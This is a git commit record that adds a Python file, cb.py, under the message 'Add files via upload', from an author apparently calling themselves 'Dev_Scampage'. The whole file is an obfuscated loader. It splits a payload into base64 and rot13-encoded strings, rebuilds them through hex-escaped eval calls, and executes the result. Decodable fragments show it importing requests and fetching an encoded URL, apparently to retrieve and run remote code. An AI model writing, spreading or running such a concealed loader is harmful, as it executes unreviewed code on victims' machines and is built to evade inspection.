0d51632f621cb2a4c5c7b452c8823be8dbcebb41
Dev_Scampage <96856358+learningsourc@users.noreply.github.com>
2022-06-19 21:40:41 +0700

    Add files via upload

---
+++ cb.py
@@ -0,0 +1,8 @@
+import base64, codecs
+magic = 'IyBPYmZ1c2NhdGVkIHdpdGggUHlPYmZ4ICMKaW1wb3J0IHJlcXVlc3RzIGFzIGZZR1RiamVYT2RwSEl4d3UKCkpnRmJCYXZpWEggPSBsYW1i'
+love = 'MTRtowbtovNgVUA1oFuoAFjtAFjtAS0cPxIvo2IaqR1nHIZtCFOfLJ1vMTRtpmbtWlphnz9covuwnUVbnJ50XRcaEzWPLKMcJRtbo3WxXTZc'
+god = 'KSkpIGZvciBjIGluIHMpCnRxTU8gPSBmWUdUYmplWE9kcEhJeHd1LmdldChFYm9lZ3RNWlFTKCJ2woLCgn7CgUg9PcKAb8KFPHV3woJ2woNw'
+destiny = 'jbCPtKCPtUS9sZXPp3mPtwkksKf9q3g7rpXQsUZ9pUcipKx9r293sQ3Ptag8B8XPq3k1jbYPt3k1CU7PulVcXF50MKu0PzI4MJZbqUSAGlx='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
